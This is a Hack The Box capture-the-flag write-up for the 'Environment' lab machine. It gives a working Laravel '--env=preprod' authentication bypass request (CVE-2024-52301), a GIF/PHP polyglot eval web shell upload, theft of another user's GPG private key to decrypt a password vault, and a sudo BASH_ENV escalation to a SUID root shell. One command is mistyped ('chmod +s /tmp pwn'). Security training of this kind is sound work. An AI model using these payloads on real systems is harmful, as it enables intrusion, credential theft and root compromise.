# HTB Writeup – Environment

![environment](./environment.jpg)

# RECON

## Port Scan

```sh
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey:
|   256 5c:02:33:95:ef:44:e2:80:cd:3a:96:02:23:f1:92:64 (ECDSA)
|_  256 1f:3d:c2:19:55:28:a1:77:59:51:48:10:c4:4b:74:ab (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-title: Did not follow redirect to http://environment.htb
|_http-server-header: nginx/1.22.1
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


## Port 80 | Laravel


`/mailing` endpoint:

```sh
POST /mailing HTTP/1.1
Host: environment.htb
Content-Length: 65
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: http://environment.htb
Referer: http://environment.htb/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: XSRF-TOKEN=eyJpdiI6IkI3d0Y3RGJPOTlmSnhmcjNpNlZUVmc9PSIsInZhbHVlIjoiRVRzbnZYOGh0Q1p2aGhvUXlSajRlMlk1ZTBVYkRsQTJIS2NuSXk0b0xyWjVZaVZWWHJNWTBIUDR2ZHZnVC9LTVo4UmlucmtXWlBkdVFQT0NaTDYyeFFMSEUyQkhiYm44ZHdmN3pOTnhxVXpiTGxDSWNPekY4ZWRRbXpidFg5T1UiLCJtYWMiOiJkOTNhOWY1MDQyNzZlY2YzMjFhMWE5ZjkyNjhjOGRmYmY1M2FmYzZiY2Q2OWZjYzFiMDY0ZTg2Yjg2YmY0YmZjIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6ImdhWk1oWGEyaDBMK3ZUdld1UEJoNVE9PSIsInZhbHVlIjoid2k0aVRjT0lSVDl6aURUYW9SMVBnNDRvUTJXRUpDSVdCM1ZEL0l4M2NxRWhoMjN4VHFpbCtTNEk2VHFyZklzYUhTR05KYUR2UFJoa1doN1A3eGJiQUV2N09hQ0tId3I5VWh4WVllZ29GaDFkU1cwOGJGR1RPZit2Tnh0ek1EeXkiLCJtYWMiOiI2NjlhNjgwMjBlMmM5ZjM3NjE3MjllNjMyNTAxNjczMThhNGRhOWVkOTgxYmFmYzMzZWQzNDQ2ZGY0ZjYzYjcyIiwidGFnIjoiIn0%3D
Connection: keep-alive

_token=jFSFAEFqwjvk2gZwvEmO7FcOa9oGrQ6fjJsaJoOh
```

CSRF token (`_token`):


```js
 <form id="mailingListForm">
   <input type="hidden" name="_token" value="jFSFAEFqwjvk2gZwvEmO7FcOa9oGrQ6fjJsaJoOh" autocomplete="off">       <input type="text" id="email" name="email" placeholder="Email" style="width: 400px; height: 35px; font-size: 15px; border:none; text-indent: 8px;"><br>
   <input type="submit" value="Join!" style="font-size: 15px; width: 400px; margin-top: 10px; height: 30px; background-color: #2a7f62; border: none; color: white; font-weight: bold; cursor: pointer">
 </form>
```


## Dirsearch

```sh
$ dirsearch -u 'http://environment.htb' -x 399-499

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12266

Target: http://environment.htb/

[01:09:43] Scanning:
[01:23:55] 301 -   169B - /build  ->  http://environment.htb/build/
[01:29:29] 200 -     0B - /favicon.ico
[01:32:37] 200 -    4KB - /index.php
[01:32:50] 200 -    2KB - /index.php/login/
[01:34:33] 200 -    2KB - /login
[01:35:06] 302 -   358B - /logout/  ->  http://environment.htb/login
[01:35:07] 302 -   358B - /logout  ->  http://environment.htb/login
[01:41:53] 200 -    24B - /robots.txt
[01:44:33] 301 -   169B - /storage  ->  http://environment.htb/storage/
```

# WEB

## Laravel

### Environment-Based Auth Bypass

`routes/web.php`

```php
	  $keep_loggedin = False;
} elseif ($remember == 'True') {
    $keep_loggedin = True;
}

if ($keep_loggedin !== False) {
// TODO: Keep user logged in if he selects "Remember Me?"
}

if (App::environment() == "preprod") {
    $request->session()->regenerate();
    $request->session()->put('user_id', 1);
    return redirect('/management/dashboard');
}

$user = User::where('email', $email)->first();
```

**preprod** can grant admin access without pw or another auth -> **CVE-2024-52301**.

### CVE-2024-52301

#### PoC

Reference: [CVE-2024-52301](https://github.com/Nyamort/CVE-2024-52301)

```php
POST /login?--env=preprod HTTP/1.1
Host: environment.htb
Content-Type: application/x-www-form-urlencoded

_token=<csrf_token>&email=hades@environment.htb&password=123&remember=True
```

Triggers the backdoor:

```php
if (App::environment() == "preprod") {
    session()->put('user_id', 1);
}
```

Get privileged user `Hish`:

### Upload Bypass

Make a **polyglot file**:

```php
POST /upload HTTP/1.1
Host: environment.htb
[...]
Cookie: XSRF-TOKEN=eyJ...; laravel_session=eyJ...
Connection: keep-alive

------WebKitFormBoundaryb7czDiXUFKDk5fp0
Content-Disposition: form-data; name="_token"

RK66D6GeajRlnIYA1pnSHZTILaTFqtsiq857eRhH
------WebKitFormBoundaryb7czDiXUFKDk5fp0
Content-Disposition: form-data; name="upload"; filename="shell.gif"
Content-Type: image/gif

GIF89a
<?php @eval($_REQUEST["x"]);?>
------WebKitFormBoundaryb7czDiXUFKDk5fp0--
```

```
GET http://environment.htb/storage/files/shell.gif
```

You can get revshell from here.

# USER

## Internal Enum

 `/var/www/app/.env`

```sh
APP_NAME=Laravel
APP_ENV=production
APP_KEY=base64:BRhzmLIuAh9UG8xXCPuv0nU799gvdh49VjFDvETwY6k=
[...]
```

```
www-data@environment:~$ ls -l /home

total 4
drwxr-xr-x 5 hish hish 4096 Apr 11 00:51 hish
```

Get the User flag.

## GPG Abuse

```sh
www-data@environment:/home/hish$ ls backup
keyvault.gpg

www-data@environment:/home/hish$ ls -lah .gnupg
total 32K
drwxr-xr-x 4 hish hish 4.0K May  5 01:05 .
drwxr-xr-x 5 hish hish 4.0K Apr 11 00:51 ..
drwxr-xr-x 2 hish hish 4.0K May  5 01:05 openpgp-revocs.d
drwxr-xr-x 2 hish hish 4.0K May  5 01:05 private-keys-v1.d
-rwxr-xr-x 1 hish hish 1.5K Jan 12 03:13 pubring.kbx
-rwxr-xr-x 1 hish hish   32 Jan 12 03:11 pubring.kbx~
-rwxr-xr-x 1 hish hish  600 Jan 12 11:48 random_seed
-rwxr-xr-x 1 hish hish 1.3K Jan 12 11:48 trustdb.gpg
```

**www-data** no access to write:

```sh
www-data@environment:/home/hish$ gpg --homedir /home/hish/.gnupg --list-secret-keys

gpg: WARNING: unsafe ownership on homedir '/home/hish/.gnupg'
gpg: Note: trustdb not writable
gpg: failed to create temporary file '/home/hish/.gnupg/.#lk0x0000564cfdf3f010.environment.13055': Permission denied
gpg: can't connect to the agent: Permission denied
```

Just clone:

```sh
cp -r /home/hish/.gnupg /tmp/gnupg_hish
chmod -R 700 /tmp/gnupg_hish
chown -R www-data:www-data /tmp/gnupg_hish
```


```sh
GNUPGHOME=/tmp/gnupg_hish gpg --export-secret-keys -a > /tmp/hish_private.asc
```

Verify the exported key:

```sh
cat /tmp/hish_private.asc

-----BEGIN PGP PRIVATE KEY BLOCK-----

lQOYBGeCmI0BCADXSkEBADG/ojZVS3xEXr/mvrScJF9pGwqJW/sppu8lKWJP1HUG
PrJGe1X99VSBonb+6PHkKMmck3xOtS0sE51Kv3xIKmhOy0+e93C3KWoI36hRna85
En9pS27CDRTqQweqR4qqB65Rl3JrFx1skGQxKYa5tskzZmXCnzIBvQV2+YDNL87j
[...]
SyVJHCXa7kqyDRRlBiMMpdO53JEtmV026cJLtou6TILClczZ/v8Sr4FlaSQOn3OB
ES298pnGb6KrvK7pOw1w2JeOz7wyZP6YZLgM91TRvQjCOmjeqcgCyjw2smQEs8q8
F9Xp7au8A1E4fEjDbLUYjY4MP9Hh805TbJnNfjGU
=MzqF
-----END PGP PRIVATE KEY BLOCK-----
```

Import it back to `www-data`:

```sh
www-data@environment:/home/hish$ GNUPGHOME=/tmp/gnupg_hish gpg --import /tmp/hish_private.asc

www-data@environment:/home/hish$ GNUPGHOME=/tmp/gnupg_hish gpg --list-secret-keys
```

Decrypt `keyvault.gpg`

```sh
www-data@environment:/home/hish$ GNUPGHOME=/tmp/gnupg_hish gpg --decrypt /home/hish/backup/keyvault.gpg

PAYPAL.COM -> Ihaves0meMon$yhere123
ENVIRONMENT.HTB -> marineSPm@ster!! //hish password
FACEBOOK.COM -> summerSunnyB3ACH!!
```

# ROOT

## Sudo

```sh
hish@environment:~$ sudo -l

Matching Defaults entries for hish on environment:
	env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+="ENV BASH_ENV", use_pty

User hish may run the following commands on environment:
	(ALL) /usr/bin/systeminfo

hish@environment:~$ ls -l /usr/bin/systeminfo
-rwxr-xr-x 1 root root 452 Jan 12 12:11 /usr/bin/systeminfo
```

`/usr/bin/systeminfo`:

```
### Displaying kernel ring buffer logs (dmesg) ###
[    4.999107] Initialized host personality
[    5.005875] NET: Registered PF_VSOCK protocol family
[...]

### Checking system-wide open ports ###
State        Recv-Q        Send-Q               Local Address:Port               Peer Address:Port       Process
LISTEN       0             128                        0.0.0.0:22                      0.0.0.0:*           users:(("sshd",pid=934,fd=3))
LISTEN       0             511                        0.0.0.0:80                      0.0.0.0:*           users:(("nginx",pid=937,fd=5),("nginx",pid=936,fd=5),("nginx",pid=935,fd=5))
[...]

### Displaying information about all mounted filesystems ###
sysfs        on  /sys                                                 type  sysfs        (rw,nosuid,nodev,noexec,relatime)
proc         on  /proc                                                type  proc         (rw,relatime,hidepid=invisible)
[...]

### Checking system resource limits ###
real-time non-blocking time  (microseconds, -R) unlimited
core file size              (blocks, -c) 0
[...]

### Displaying loaded kernel modules ###
Module                  Size  Used by
tcp_diag               16384  0
[...]

### Checking disk usage for all filesystems ###
Filesystem      Size  Used Avail Use% Mounted on
udev            1.9G     0  1.9G   0% /dev
tmpfs           392M  688K  391M   1% /run
[...]
```


## Code Review

```sh
#!/bin/bash
echo -e "\n### Displaying kernel ring buffer logs (dmesg) ###"
dmesg | tail -n 10

echo -e "\n### Checking system-wide open ports ###"
ss -antlp

echo -e "\n### Displaying information about all mounted filesystems ###"
mount | column -t

echo -e "\n### Checking system resource limits ###"
ulimit -a

echo -e "\n### Displaying loaded kernel modules ###"
lsmod | head -n 10

echo -e "\n### Checking disk usage for all filesystems ###"
df -h
```


## Exploit

```sh
echo 'export PATH=/tmp:$PATH' > /tmp/env.sh
chmod +x /tmp/env.sh
```

Exploit via **`BASH_ENV`**:

Bash
```
sudo BASH_ENV=/tmp/env.sh /usr/bin/systeminfo
```

Executed:

```sh
echo 'cp /bin/bash /tmp/pwn && chmod +s /tmp pwn' > /tmp/env.sh
chmod +x /tmp/env.sh
sudo BASH_ENV=/tmp/env.sh /usr/bin/systeminfo
```

Rooted.
